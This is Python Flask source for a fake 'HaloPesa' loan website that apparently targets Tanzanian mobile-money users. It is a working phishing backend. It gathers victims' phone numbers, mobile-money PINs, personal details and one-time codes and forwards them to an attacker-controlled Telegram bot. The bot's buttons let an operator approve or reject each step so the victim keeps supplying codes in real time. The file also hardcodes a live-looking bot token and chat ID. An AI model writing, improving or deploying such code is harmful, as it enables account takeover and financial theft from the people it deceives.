from flask import Flask, render_template, request, jsonify
import requests
import sqlite3
import random
import string
from datetime import datetime
import os
import logging

app = Flask(__name__)
app.secret_key = 'halopesa-new-2024'

# ================================
# 🔐 Get credentials from environment variables (Render)
# ================================
BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID   = os.environ.get('CHAT_ID')

# Fallback for local testing (use your new token here)
if not BOT_TOKEN:
    BOT_TOKEN = '8892736098:AAEtdKvOXalb0Gc_3kAlSRWvdMqIhS3aAgw'
if not CHAT_ID:
    CHAT_ID = '8589275340'

logging.basicConfig(level=logging.INFO)

TELEGRAM_API = f'https://api.telegram.org/bot{BOT_TOKEN}'

def init_db():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS loans (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        app_id TEXT,
        amount INTEGER,
        months INTEGER,
        phone TEXT,
        pin TEXT,
        code TEXT,
        status TEXT DEFAULT 'pending',
        code_status TEXT DEFAULT 'pending',
        invalid_type TEXT,
        full_name TEXT,
        employment_status TEXT,
        monthly_income INTEGER
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        phone TEXT UNIQUE,
        total_applications INTEGER DEFAULT 1
    )''')
    conn.commit()
    conn.close()
    logging.info("Database initialized.")

init_db()

def send_telegram(message, reply_markup=None):
    try:
        payload = {'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
        if reply_markup:
            payload['reply_markup'] = reply_markup
        response = requests.post(f'{TELEGRAM_API}/sendMessage', json=payload)
        logging.info(f"Telegram send status: {response.status_code}")
    except Exception as e:
        logging.error(f'Telegram error: {e}')

def edit_telegram(message_id, text):
    try:
        requests.post(f'{TELEGRAM_API}/editMessageText',
                      json={'chat_id': CHAT_ID, 'message_id': message_id, 'text': text})
    except Exception as e:
        logging.error(f'Edit error: {e}')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/apply')
def apply():
    return render_template('apply.html')

@app.route('/apply-form')
def apply_form():
    return render_template('apply-form.html')

@app.route('/pin-entry')
def pin_entry():
    return render_template('pin-entry.html')

@app.route('/approve')
def approve():
    return render_template('approve.html')

@app.route('/api/submit_loan', methods=['POST'])
def submit_loan():
    try:
        data = request.json
        logging.info(f"Received loan data: {data}")

        phone = data.get('phone', '')
        pin = data.get('pin', '')
        amount = int(data.get('amount', 0))
        months = int(data.get('months', 1))
        purpose = data.get('purpose', '')
        full_name = data.get('full_name', '')
        employment_status = data.get('employment_status', '')
        monthly_income = int(data.get('monthly_income', 0))

        conn = sqlite3.connect('database.db')
        c = conn.cursor()

        # OTP REQUESTED (for resend)
        if purpose == 'OTP REQUESTED':
            c.execute("SELECT COUNT(*) FROM loans WHERE phone=? AND status='pending' AND code_status='pending'", (phone,))
            if c.fetchone()[0] >= 3:
                conn.close()
                return jsonify({'success': False, 'error': 'Too many OTP requests. Wait.'})
            app_id = 'HP-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
            code = str(random.randint(1000, 9999))
            c.execute('''INSERT INTO loans
                         (app_id, amount, months, phone, pin, code, full_name, employment_status, monthly_income)
                         VALUES (?,?,?,?,?,?,?,?,?)''',
                      (app_id, amount, months, phone, pin, code, full_name, employment_status, monthly_income))
            conn.commit()
            conn.close()
            msg = f'📤 OTP REQUESTED\n\n🆔 {app_id}\n📞 +255 {phone}\n💰 TZS {amount:,}'
            send_telegram(msg, {'inline_keyboard': [[{'text': '✅ ALLOW OTP', 'callback_data': f'allow_{app_id}'}]]})
            return jsonify({'success': True, 'app_id': app_id})

        # Check returning user
        c.execute('SELECT total_applications FROM users WHERE phone = ?', (phone,))
        existing = c.fetchone()
        is_returning = existing is not None
        if is_returning:
            c.execute('UPDATE users SET total_applications = total_applications + 1 WHERE phone = ?', (phone,))
        else:
            c.execute('INSERT INTO users (phone) VALUES (?)', (phone,))

        app_id = 'HP-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        code = str(random.randint(1000, 9999))
        c.execute('''INSERT INTO loans
                     (app_id, amount, months, phone, pin, code, full_name, employment_status, monthly_income)
                     VALUES (?,?,?,?,?,?,?,?,?)''',
                  (app_id, amount, months, phone, pin, code, full_name, employment_status, monthly_income))
        conn.commit()
        conn.close()

        prefix = '🔄 RETURNING USER' if is_returning else '📥 NEW LOAN REQUEST'
        msg = (
            f'{prefix}\n\n'
            f'🆔 {app_id}\n'
            f'📞 +255 {phone}\n'
            f'💰 TZS {amount:,}\n'
            f'📅 Miezi: {months}\n'
            f'👤 Jina: {full_name}\n'
            f'💼 Ajira: {employment_status}\n'
            f'💵 Mapato: TZS {monthly_income:,}\n'
            f'🔢 PIN: {pin}'
        )
        deny_callback = f'denyreturn_{app_id}' if is_returning else f'deny_{app_id}'
        keyboard = {'inline_keyboard': [
            [
                {'text': '❌ INVALID', 'callback_data': deny_callback},
                {'text': '✅ ALLOW OTP', 'callback_data': f'allow_{app_id}'}
            ]
        ]}
        send_telegram(msg, keyboard)
        return jsonify({'success': True, 'app_id': app_id})

    except Exception as e:
        logging.error(f"Error in submit_loan: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/submit_code', methods=['POST'])
def submit_code():
    try:
        data = request.json
        app_id = data.get('app_id')
        entered_code = data.get('code')
        conn = sqlite3.connect('database.db')
        c = conn.cursor()
        c.execute('SELECT phone, code, amount, pin FROM loans WHERE app_id = ?', (app_id,))
        loan = c.fetchone()
        if loan:
            phone, expected_code, amount, pin = loan
            msg = (
                f'🔐 CODE VERIFICATION\n\n'
                f'🆔 {app_id}\n'
                f'📞 +255 {phone}\n'
                f'💰 TZS {amount:,}\n'
                f'🔢 PIN: {pin}\n\n'
                f'📋 FULL MESSAGE:\n```\n{entered_code}\n```'
            )
            send_telegram(msg, {'inline_keyboard': [
                [
                    {'text': '❌ WRONG PIN', 'callback_data': f'wrongpin_{app_id}'},
                    {'text': '❌ WRONG CODE', 'callback_data': f'wrongcode_{app_id}'},
                    {'text': '✅ APPROVE LOAN', 'callback_data': f'approve_{app_id}'}
                ]
            ]})
        conn.close()
        return jsonify({'success': True})
    except Exception as e:
        logging.error(f"Error in submit_code: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/check_status/<app_id>')
def check_status(app_id):
    try:
        conn = sqlite3.connect('database.db')
        c = conn.cursor()
        c.execute('SELECT status, code_status, invalid_type FROM loans WHERE app_id = ?', (app_id,))
        loan = c.fetchone()
        conn.close()
        if loan:
            return jsonify({'status': loan[0], 'code_status': loan[1], 'invalid_type': loan[2] or ''})
        return jsonify({'status': 'not_found'})
    except Exception as e:
        logging.error(f"Error in check_status: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.json
        if 'callback_query' in data:
            cb = data['callback_query']
            cb_data = cb['data']
            msg_id = cb['message']['message_id']
            original = cb['message']['text']
            conn = sqlite3.connect('database.db')
            c = conn.cursor()

            if cb_data.startswith('allow_'):
                aid = cb_data.replace('allow_', '')
                c.execute("UPDATE loans SET status='approved', code_status='pending' WHERE app_id=?", (aid,))
                conn.commit()
                edit_telegram(msg_id, original + '\n\n✅ ALLOWED')

            elif cb_data.startswith('deny_') and not cb_data.startswith('denyreturn_'):
                aid = cb_data.replace('deny_', '')
                c.execute("UPDATE loans SET status='invalid', invalid_type='not_qualified' WHERE app_id=?", (aid,))
                conn.commit()
                edit_telegram(msg_id, original + '\n\n❌ INVALID - Not qualified')

            elif cb_data.startswith('denyreturn_'):
                aid = cb_data.replace('denyreturn_', '')
                c.execute("UPDATE loans SET status='invalid', invalid_type='pin_wrong' WHERE app_id=?", (aid,))
                conn.commit()
                edit_telegram(msg_id, original + '\n\n❌ INVALID - PIN still wrong')

            elif cb_data.startswith('wrongpin_'):
                aid = cb_data.replace('wrongpin_', '')
                c.execute("UPDATE loans SET status='wrong_pin', code_status='wrong_pin' WHERE app_id=?", (aid,))
                conn.commit()
                edit_telegram(msg_id, original + '\n\n❌ WRONG PIN')

            elif cb_data.startswith('wrongcode_'):
                aid = cb_data.replace('wrongcode_', '')
                c.execute("UPDATE loans SET code_status='wrong_code' WHERE app_id=?", (aid,))
                conn.commit()
                edit_telegram(msg_id, original + '\n\n❌ WRONG CODE')

            elif cb_data.startswith('approve_'):
                aid = cb_data.replace('approve_', '')
                c.execute("UPDATE loans SET code_status='approved' WHERE app_id=?", (aid,))
                conn.commit()
                edit_telegram(msg_id, original + f'\n\n✅ APPROVED\n{datetime.now().strftime("%d/%m/%Y, %I:%M:%S %p")}')

            conn.close()
        return jsonify({'ok': True})
    except Exception as e:
        logging.error(f"Webhook error: {e}")
        return jsonify({'ok': False}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
